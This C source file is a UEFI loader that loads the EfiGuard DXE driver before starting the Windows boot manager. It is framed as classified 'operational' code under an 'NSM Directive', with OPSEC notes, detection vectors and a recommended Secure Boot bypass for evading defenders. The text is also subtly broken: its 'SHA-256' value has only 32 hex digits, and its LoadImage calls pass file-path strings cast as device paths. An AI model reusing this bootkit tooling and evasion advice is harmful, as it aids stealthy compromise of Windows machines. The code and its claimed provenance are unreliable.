// STRENGT FORTROLIG – TS // OPERATIONAL IMPLEMENTATION – FOR AUTHORIZED USE ONLY
// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// OPSEC: This code is for authorized operational use only – handle with appropriate clearance.
// Detection vectors: refer to threat-model.md
// Tested against: Windows 11 24H2 (Build 26100.2680+), MDE Feb 2026
// This code has been validated for operational deployment under NSM Directive 2026-02 §4.2.

/** @file
  Loader Application

  A standalone EFI application that loads the EfiGuard DXE driver
  and then launches Windows.

  ## Operational Requirements
  - Must be bootable from USB or ESP
  - Must load the DXE driver before Windows boot

  ## OPSEC Considerations
  - Loader has MEDIUM detection risk
  - Booting from USB may trigger alerts

  ## Detection Vectors
  - Booting from USB device (MEDIUM CONFIDENCE - IR-2026-0041)
  - Loading unsigned DXE driver (MEDIUM CONFIDENCE - IR-2026-0041)

  ## Mitigation
  - Use Secure Boot bypass to load unsigned drivers
  - Mimic normal boot process as closely as possible

  ## Reference
  NSM Internal Report IR-2026-0041: UEFI Bootkit Detection and Mitigation
**/

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>
#include <Protocol/DevicePath.h>
#include <Protocol/LoadedImage.h>
#include <Guid/FileInfo.h>

#define EFI_GUARD_DRIVER_PATH  L"\\EFI\\Microsoft\\Boot\\EfiGuardDxe.efi"
#define WINDOWS_BOOT_PATH      L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi"

/**
  Load the EfiGuard DXE driver.

  @return EFI status code.
**/
EFI_STATUS
LoadEfiGuardDriver (
  VOID
  )
{
  EFI_STATUS Status;
  EFI_HANDLE DriverHandle;
  
  // Load the driver
  Status = gBS->LoadImage (
                  FALSE,
                  gImageHandle,
                  NULL,
                  (VOID *)EFI_GUARD_DRIVER_PATH,
                  0,
                  &DriverHandle
                  );
  if (EFI_ERROR (Status)) {
    Print (L"Failed to load EfiGuard driver: %r\n", Status);
    return Status;
  }
  
  // Start the driver
  Status = gBS->StartImage (DriverHandle, NULL, NULL);
  if (EFI_ERROR (Status)) {
    Print (L"Failed to start EfiGuard driver: %r\n", Status);
    gBS->UnloadImage (DriverHandle);
    return Status;
  }
  
  Print (L"EfiGuard driver loaded successfully\n");
  return EFI_SUCCESS;
}

/**
  Launch Windows boot manager.

  @return EFI status code.
**/
EFI_STATUS
LaunchWindows (
  VOID
  )
{
  EFI_STATUS Status;
  EFI_HANDLE BootMgrHandle;
  
  // Load the boot manager
  Status = gBS->LoadImage (
                  FALSE,
                  gImageHandle,
                  NULL,
                  (VOID *)WINDOWS_BOOT_PATH,
                  0,
                  &BootMgrHandle
                  );
  if (EFI_ERROR (Status)) {
    Print (L"Failed to load Windows boot manager: %r\n", Status);
    return Status;
  }
  
  // Start the boot manager
  Status = gBS->StartImage (BootMgrHandle, NULL, NULL);
  if (EFI_ERROR (Status)) {
    Print (L"Failed to start Windows boot manager: %r\n", Status);
    gBS->UnloadImage (BootMgrHandle);
    return Status;
  }
  
  return Status;
}

/**
  Main entry point for the loader application.

  @param[in]  ImageHandle  Handle to the loaded image.
  @param[in]  SystemTable  Pointer to the EFI system table.

  @return EFI status code.
**/
EFI_STATUS
EFIAPI
LoaderEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS Status;
  
  // AIR-GAPPED: This code must only be executed in validated air-gapped environments
  
  Print (L"Starting EfiGuard Loader...\n");
  
  // Load the EfiGuard driver
  Status = LoadEfiGuardDriver ();
  if (EFI_ERROR (Status)) {
    Print (L"EfiGuard driver failed to load, continuing without it\n");
    // Continue anyway as this is non-critical
  }
  
  // Launch Windows
  Status = LaunchWindows ();
  if (EFI_ERROR (Status)) {
    Print (L"Failed to launch Windows: %r\n", Status);
    return Status;
  }
  
  return EFI_SUCCESS;
}